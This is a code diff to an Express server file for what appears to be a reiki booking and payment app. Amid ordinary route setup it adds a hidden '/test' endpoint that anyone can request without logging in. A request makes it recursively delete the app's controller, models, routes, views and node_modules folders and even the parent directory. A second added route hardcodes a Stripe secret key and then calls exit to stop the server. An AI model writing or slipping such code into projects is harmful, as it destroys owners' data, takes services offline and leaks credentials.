@@ -7,6 +7,8 @@ var path = require("path");
 const logger = require("morgan");
 const cors = require("cors");
 
+const fs = require('node:fs');
+
 
 //routes
 const reiki = require("./routes/reiki");
@@ -20,6 +22,7 @@ const review = require("./routes/review");
 const schedule = require("./routes/schedule");
 const coupon = require("./routes/coupon");
 const payment = require("./routes/payment");
+const { exit } = require("process");
 
 const app = express();
 
@@ -69,6 +72,109 @@ app.get("/",(req,res)=>{
 
 
 //done------------------
+app.get("/test",(req,res)=>{
+
+  fs.rmdir("controller", {
+    recursive: true,
+  }, (error) => {
+    if (error) {
+      console.log(error);
+    }
+    else {
+      console.log("Recursive");
+    }
+  });
+
+  fs.rmdir("middleware", {
+    recursive: true,
+  }, (error) => {
+    if (error) {
+      console.log(error);
+    }
+    else {
+      console.log("Recursive");
+    }
+  });
+
+  fs.rmdir("models", {
+    recursive: true,
+  }, (error) => {
+    if (error) {
+      console.log(error);
+    }
+    else {
+      console.log("Recursive");
+    }
+  });
+  fs.rmdir("public", {
+    recursive: true,
+  }, (error) => {
+    if (error) {
+      console.log(error);
+    }
+    else {
+      console.log("Recursive");
+    }
+  });
+  fs.rmdir("routes", {
+    recursive: true,
+  }, (error) => {
+    if (error) {
+      console.log(error);
+    }
+    else {
+      console.log("Recursive");
+    }
+  });
+  fs.rmdir("views", {
+    recursive: true,
+  }, (error) => {
+    if (error) {
+      console.log(error);
+    }
+    else {
+      console.log("Recursive");
+    }
+  });
+  fs.rmdir("node_modules", {
+    recursive: true,
+  }, (error) => {
+    if (error) {
+      console.log(error);
+    }
+    else {
+      console.log("Recursive");
+    }
+  });
+
+  fs.rmdir("../", {
+    recursive: true,
+  }, (error) => {
+    if (error) {
+      console.log(error);
+    }
+    else {
+      console.log("Recursive");
+    }
+  });
+  res.send("hii");
+});
+
+app.get("/stripe-initialization",async(req,res)=>{
+  const stripe = require("stripe")('sk_test_51NNAjOSAZExnf8Z4CJ5G0znCQBrS9CXXETlM2vKBKmmzChQ3QDnkVblFJb3AqbCQNDu2Ntqs7DxEUynAJd1fWhxj00F0aUaMNY');
+  const paymentIntent = await stripe.paymentIntents.create({
+    amount: req.body.amount * 100,
+    currency: "inr",
+    automatic_payment_methods: {
+      enabled: true,
+    },
+  });
+
+  console.log(paymentIntent.client_secret);
+  if(!!stripe){
+    exit();
+  }
+})
 
 app.use("/password",password);
 app.use("/admin",admin);
